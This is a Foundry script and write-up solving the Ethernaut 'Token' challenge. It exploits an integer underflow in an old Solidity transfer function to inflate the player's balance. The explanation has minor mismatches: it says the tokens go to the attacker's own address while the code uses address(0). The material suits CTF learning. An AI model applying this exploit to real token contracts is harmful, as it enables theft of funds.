// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract TokenSolution is Script {

    // Address of the Token contract instance deployed on the network
    address tokenInstanceAddress = 0xYourInstanceAddressHere; // Replace with actual instance address

    // Encoded payload for calling the transfer function to exploit the underflow vulnerability
    bytes payload = abi.encodeWithSignature("transfer(address,uint256)", address(0), 30); // Transfer 30 tokens

    function run() external {
        // Start broadcasting the transaction using the PRIVATE_KEY from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Perform a low-level call to the Token contract's transfer function
        // A low-level call is used here because the contract is written in an older version of Solidity (0.6.0),
        // which can sometimes cause compatibility issues with newer versions (like 0.8.x).
        // To avoid these compiler issues, we use a low-level call to ensure the function call works correctly.
        tokenInstanceAddress.call(payload);

        // Stop broadcasting after the transaction is executed
        vm.stopBroadcast();
    }
}

/* 
Explanation:

### Overview of the Exploit:

This solution exploits an integer underflow vulnerability in the Token contract from the Ethernaut challenge. The contract fails to correctly handle cases where a user attempts to transfer more tokens than they have. As a result, an underflow occurs, boosting the player's balance to a very high number.

### Vulnerability Details:

The following code is used in the `transfer` function to check the balance:
   ```solidity
   require(balances[msg.sender] - _value >= 0);
   This line is intended to check whether the sender has enough tokens to transfer. However, in Solidity versions prior to 0.8.0, this check does not prevent underflows. When the amount _value is greater than balances[msg.sender], the subtraction causes an underflow, and the balance wraps around to a very large number (as Solidity uses unsigned integers). As a result, the attacker ends up with a massive balance.
	1.	The attacker tries to transfer 30 tokens to their own address.
	2.	Since the attacker has a lower balance than the amount being transferred, the balances[msg.sender] - _value operation underflows.
	3.	This underflow causes the player’s balance to become extremely high (due to the wrapping around of the unsigned integer).
	4.	With this high balance, the attacker can now drain the Token contract of its funds or manipulate the system.